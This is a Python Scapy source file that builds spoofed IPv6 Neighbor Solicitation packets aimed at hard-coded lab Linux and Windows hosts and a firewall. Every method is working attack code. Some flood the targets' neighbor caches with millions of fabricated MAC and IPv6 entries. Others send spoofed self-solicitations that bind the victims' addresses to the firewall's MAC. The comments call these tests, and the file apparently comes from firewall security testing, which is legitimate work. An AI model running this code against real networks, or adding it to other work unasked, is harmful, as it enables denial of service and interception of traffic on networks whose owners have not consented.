#!/usr/bin/python

from scapy.all import *


"""
the class build NS messages
"""
class NS:
    
    def __init__(self):
        #TODO: PROBLEM WITH STATIC FIREWALL ADR (ASA IS DIFFERENT)
        self.linux = "2001:abcd:acad:2:a00:27ff:fe84:bb37"
        self.linuxMac = "08:00:27:84:bb:37"
        self.linuxSolicitedMulti = "ff02::1:ff84:bb37"
        self.win = "2001:abcd:acad:2:b485:2aec:9447:fd83"
        self.winMac = "08:00:27:82:a6:ec"
        self.winSolicitedMulti = "ff02::1:ff47:fd83"
        self.firewallMac = "08:00:27:b1:da:41"
        print 'Neighbor Solicitation'


    #TODO: VERIFY SRC 0::0
    def buildPacketInternalCacheFlooding(self, mac, srcGlobalUni, ipAdr):
        sourceLinkLayer = ICMPv6NDOptSrcLLAddr(lladdr=mac)
        return Ether(src=mac)/IPv6(dst=ipAdr,src="0::0")/ICMPv6ND_NS(tgt=srcGlobalUni)/sourceLinkLayer

    def buildPacketInternalSelfSolicitation(self, srcMac, srcIpAdr, solicitedMulti):
        sourceLinkLayer = ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)
        return Ether(src=srcMac)/IPv6(dst=solicitedMulti,src=srcIpAdr)/ICMPv6ND_NS(tgt=srcIpAdr)/sourceLinkLayer

    def buildPacketRemoteLinuxSelfSolicitation(self):
        sourceLinkLayer = ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)
        return Ether(src=self.firewallMac)/IPv6(dst=self.linux,src=self.linux)/ICMPv6ND_NS(tgt=self.linux)/sourceLinkLayer

    #interface to Internal Tests

    def execModuleInternalCacheFloodingWin(self, exitIface):
        start = 0x000001
        end = 0xfffffe
        for t in xrange(start, end):
            hex24 = '{:06x}'.format(t)
            mac = "08:00:27:" + hex24[:2] + ":" + hex24[2:4] + ":" + hex24[4:6]
            globalUni = "2001:abcd:acad:2::" + hex24[:2] + ":" + hex24[2:4] + ":" + hex24[4:6]
            packetContainer = self.buildPacketInternalCacheFlooding(mac, globalUni, self.win)
            sendp(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalCacheFloodingLinux(self, exitIface):
        start = 0x000001
        end = 0xfffffe
        for t in xrange(start, end):
            hex24 = '{:06x}'.format(t)
            mac = "08:00:27:" + hex24[:2] + ":" + hex24[2:4] + ":" + hex24[4:6]
            globalUni = "2001:abcd:acad:2::" + hex24[:2] + ":" + hex24[2:4] + ":" + hex24[4:6]
            packetContainer = self.buildPacketInternalCacheFlooding(mac, globalUni, self.linux)
            sendp(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalWinSelfSol(self, exitIface):
        packetContainer = self.buildPacketInternalSelfSolicitation(self.winMac, self.win, self.winSolicitedMulti)
        for t in range(1,100):
            sendp(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalLinuxSelfSol(self, exitIface):
        packetContainer = self.buildPacketInternalSelfSolicitation(self.linuxMac, self.linux, self.linuxSolicitedMulti)
        for t in range(1,100):
            sendp(packetContainer, iface=exitIface, verbose=False)

    #interface to external test
    def execModuleRemoteLinuxSelfSol(self, exitIface):
        packetContainer = self.buildPacketRemoteLinuxSelfSolicitation()
        for t in range(1,100):
            sendp(packetContainer, iface=exitIface, verbose=False)
